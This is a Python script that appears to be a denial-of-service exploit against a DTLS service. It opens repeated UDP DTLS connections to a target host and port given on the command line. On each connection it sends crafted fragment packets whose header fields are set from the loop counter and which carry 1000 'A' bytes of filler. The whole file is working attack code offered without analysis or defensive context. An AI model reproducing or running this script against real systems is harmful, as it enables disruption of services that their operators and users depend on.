import ssl
import struct
import sys
from socket import socket, AF_INET, SOCK_DGRAM
from dtls import do_patch, sslconnection

def open_socket(host, port):
    sock = ssl.wrap_socket(socket(AF_INET, SOCK_DGRAM))
    setattr(sock, "ssl_version", sslconnection.PROTOCOL_DTLSv1)
    sock.connect((host, port))
    return sock

def create_dos_packet():
    fragment = "A" * 1000
    _buffer = struct.pack(
        "<HHHHH",
        5,                  # id
        len(fragment) + 6,  # full packet
        i,                  # fragment id
        i,                  # number of fragments
        1000                # length of a fragment
    )
    _buffer += fragment
    return _buffer

if __name__ == "__main__":
    do_patch() # applies DTLS patches to openssl
    
    host = sys.argv[1]
    port = int(sys.argv[2])

    for i in range(0, 0x1337):
        sock = open_socket(host, port)
        for j in range(0, 4):
            packet = create_dos_packet()
            sock.write(packet)
        sock.close()